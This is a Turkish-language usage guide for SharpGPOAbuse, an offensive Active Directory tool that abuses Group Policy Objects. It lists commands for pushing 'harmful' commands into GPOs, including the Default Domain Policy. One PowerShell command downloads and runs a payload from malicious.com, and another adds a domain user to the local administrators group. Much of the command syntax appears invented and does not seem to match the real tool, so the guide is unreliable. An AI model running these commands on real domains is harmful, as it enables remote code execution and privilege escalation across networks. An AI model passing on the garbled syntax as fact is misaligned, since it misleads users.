c# SharpGPOAbuse.exe Kullanım Kılavuzu

## Giriş
SharpGPOAbuse, Active Directory ortamlarında Grup Politika Nesnelerini (GPO) kötüye kullanarak yetki yükseltmek veya sistem üzerinde kontrol sağlamak için tasarlanmış bir siber güvenlik aracıdır. Bu araç, yanlış yapılandırılmış veya güvenlik açıkları barındıran GPO nesnelerinden yararlanabilir.

---

## Özellikler
- **Yetki Eskalasyonu**: Yanlış yapılandırılmış GPO nesnelerinden yararlanarak yetki yükseltme.
- **GPO Manipülasyonu**: Çeşitli saldırı teknikleri ile GPO nesnelerini değiştirme.
- **Yerleşik Destek**: Yüksek düzeyde özelleştirilmiş saldırı senaryoları oluşturma.

---

## Gereksinimler
- Windows işletim sistemi
- Active Directory ortamında yeterli erişim
- .NET Framework yüklü olmalıdır

---

## Komut Satırı Kullanımı

### Yardım Mesajını Görüntüleme
SharpGPOAbuse'un yardım mesajını görmek için:
```cmd
SharpGPOAbuse.exe -h
```

### Yeni Bir GPO Nesnesi Oluşturma
Bir GPO nesnesi oluşturarak hedef sisteme zararlı bir komut eklemek için:
```cmd
SharpGPOAbuse.exe create -name "Yeni_GPO" -command "C:\Temp\malicious.bat"
```

### Mevcut Bir GPO Nesnesine Komut Eklemek
Var olan bir GPO nesnesine zararlı bir komut eklemek için:
```cmd
SharpGPOAbuse.exe modify -name "Hedef_GPO" -command "powershell.exe -ep bypass -Command \"Invoke-WebRequest -Uri http://malicious.com/payload.ps1 -OutFile C:\Temp\payload.ps1; C:\Temp\payload.ps1\""
```

### GPO Nesnesini Silme
Bir GPO nesnesini kaldırmak için:
```cmd
SharpGPOAbuse.exe delete -name "Silinecek_GPO"
```

### GPO Nesnesine Kullanıcı veya Grup Ekleme
Bir GPO nesnesine yeni bir kullanıcı veya grup eklemek için:
```cmd
SharpGPOAbuse.exe add-permission -name "Hedef_GPO" -user "DOMAIN\Kullanici" -permission "FULLCONTROL"
```

### GPO İle Sistem Servisini Manipüle Etme
Bir GPO nesnesine sistem servisini değiştirecek bir betik eklemek için:
```cmd
SharpGPOAbuse.exe abuse -name "Hedef_GPO" -service "HedefServis" -command "net localgroup administrators DOMAIN\HedefKullanici /add"
```

---

## Örnek Kullanımlar

### Varsayılan Domain Policy'yi Manipüle Etme
Varsayılan Domain Policy'sine zararlı bir PowerShell komutu eklemek için:
```cmd
SharpGPOAbuse.exe modify -name "Default Domain Policy" -command "powershell.exe -ep bypass -Command \"Start-Process cmd -ArgumentList '/c whoami > C:\Temp\output.txt'\""
```

### Tüm GPO Nesnelerini Listeleme
Active Directory'deki tüm GPO nesnelerini listelemek için:
```cmd
SharpGPOAbuse.exe list
```

### JSON Formatında GPO Verilerini Kaydetme
Mevcut GPO nesnelerini JSON formatında bir dosyaya kaydetmek için:
```cmd
SharpGPOAbuse.exe list -format json -output "C:\Temp\gpo_data.json"
```

---

## Derleme Talimatları
SharpGPOAbuse kaynak koddan derlenebilir.

### Adımlar:
1. Visual Studio Community Edition'ı yükleyin.
2. Projeyi açın (`SharpGPOAbuse.sln`).
3. Çözüm yapılandırmasını "Release" olarak seçin.
4. Projeyi derleyin.

---

## Kaynaklar
- [SharpGPOAbuse GitHub](https://github.com/GhostPack/SharpGPOAbuse)
- [GhostPack Belgeleri](https://posts.specterops.io/)

Bu rehber, SharpGPOAbuse aracını kullanmanın temel adımlarını kapsamaktadır. Daha fazla bilgi için yukarıdaki bağlantılara göz atabilirsiniz.
